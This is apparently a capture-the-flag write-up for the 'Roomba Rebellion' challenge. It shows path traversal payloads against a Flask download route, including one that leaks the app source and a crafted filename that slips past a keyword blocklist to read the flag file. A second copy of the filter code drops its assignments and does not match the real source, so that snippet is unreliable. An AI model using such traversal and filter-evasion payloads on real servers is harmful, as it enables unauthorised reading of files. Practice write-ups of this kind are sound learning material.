## Roomba Rebellion

First, you can retrieve the source code using this payload: `../main.py`.

This yields the following source code:
```py
from flask import Flask, request, send_file, render_template
import os

def filter(filename: str) -> str:
    filename = filename.replace('R', 'f')
    filename = filename.replace('O', 'g')
    filename = filename.replace('O', 'h')
    filename = filename.replace('M', 'x')
    filename = filename.replace('B', 'j')
    filename = filename.replace('A', 'k')
    return filename

app = Flask(__name__)
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/download')
def download():
    filename = request.args.get('file', '')
    if any(keyword in filename for keyword in ['g.t', 'flag.txt', 'txt', 'flag']):
        return "Roomba Error: Hacking DETECTED!!", 400
    
    filename = filter(filename)
    file_path = os.path.join(BASE_DIR, 'static', filename)
    try:
        return send_file(file_path)
    except Exception as e:
        return f"Roomba Error: {str(e)}", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

Now, you need to bypass the filter:
```py
def filter(filename: str) -> str:
    filename.replace('R', 'f')
    filename.replace('O', 'g')
    filename.replace('O', 'h')
    filename.replace('M', 'x')
    filename.replace('B', 'j')
    filename.replace('A', 'k')
    return filename
```

## Final Payload

```
../RlaO.tMt
```

Use this payload to obtain the flag!